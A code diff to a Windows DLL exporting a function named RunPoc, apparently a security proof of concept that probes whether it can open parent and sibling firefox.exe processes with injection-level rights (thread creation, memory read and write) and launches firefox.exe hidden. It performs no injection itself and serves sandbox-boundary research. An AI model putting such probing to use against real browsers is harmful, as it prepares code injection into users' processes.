@@ -5,6 +5,7 @@
 #include <shldisp.h>
 #include <shellapi.h>
 #include <shobjidl.h>
+#include <tlhelp32.h>
 #include <winrt/Windows.ApplicationModel.h>
 #include <winrt/Windows.ApplicationModel.Background.h>
 #include <winrt/Windows.Foundation.h>
@@ -104,6 +105,70 @@ void CaptureCurrentProcess(TokenSnapshot& snapshot) {
   CloseHandle(token);
 }
 
+void ProbeFirefoxProcessAccess(LaunchContext& context) {
+  context.parent_injection_open_error = ERROR_NOT_FOUND;
+  context.parent_injection_access = FALSE;
+  context.sibling_injection_open_error = ERROR_NOT_FOUND;
+  context.sibling_injection_access = FALSE;
+
+  const DWORD injection_access =
+      PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+      PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
+      PROCESS_VM_READ | PROCESS_VM_WRITE;
+  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (snapshot == INVALID_HANDLE_VALUE) {
+    context.parent_injection_open_error = GetLastError();
+    context.sibling_injection_open_error = context.parent_injection_open_error;
+    return;
+  }
+
+  PROCESSENTRY32W entry{};
+  entry.dwSize = sizeof(entry);
+  if (Process32FirstW(snapshot, &entry)) {
+    do {
+      if (entry.th32ProcessID == GetCurrentProcessId()) {
+        context.parent_pid = entry.th32ParentProcessID;
+        break;
+      }
+    } while (Process32NextW(snapshot, &entry));
+  }
+
+  if (context.parent_pid) {
+    SetLastError(ERROR_SUCCESS);
+    HANDLE parent = OpenProcess(injection_access, FALSE, context.parent_pid);
+    context.parent_injection_access = parent != nullptr;
+    context.parent_injection_open_error =
+        parent ? ERROR_SUCCESS : GetLastError();
+    if (parent) {
+      CloseHandle(parent);
+    }
+  }
+
+  entry = {};
+  entry.dwSize = sizeof(entry);
+  if (Process32FirstW(snapshot, &entry)) {
+    do {
+      if (entry.th32ProcessID == GetCurrentProcessId() ||
+          entry.th32ProcessID == context.parent_pid ||
+          _wcsicmp(entry.szExeFile, L"firefox.exe") != 0) {
+        continue;
+      }
+      SetLastError(ERROR_SUCCESS);
+      HANDLE sibling =
+          OpenProcess(injection_access, FALSE, entry.th32ProcessID);
+      if (sibling) {
+        context.sibling_injection_access = TRUE;
+        context.sibling_injection_open_error = ERROR_SUCCESS;
+        context.sibling_injection_pid = entry.th32ProcessID;
+        CloseHandle(sibling);
+        break;
+      }
+      context.sibling_injection_open_error = GetLastError();
+    } while (Process32NextW(snapshot, &entry));
+  }
+  CloseHandle(snapshot);
+}
+
 }  // namespace
 
 extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
@@ -125,6 +190,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
   context->background_register_hresult = E_PENDING;
   context->background_registered = FALSE;
   CaptureCurrentProcess(context->caller);
+  ProbeFirefoxProcessAccess(*context);
 
   const HRESULT initialize_result = RoInitialize(RO_INIT_MULTITHREADED);
   const bool should_uninitialize = SUCCEEDED(initialize_result);
@@ -196,7 +262,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
     info.cbSize = sizeof(info);
     info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
     info.lpVerb = L"open";
-    info.lpFile = shell_target.c_str();
+    info.lpFile = L"firefox.exe";
     info.lpParameters = context->shell_execute_arguments;
     info.nShow = SW_HIDE;
     SetLastError(ERROR_SUCCESS);
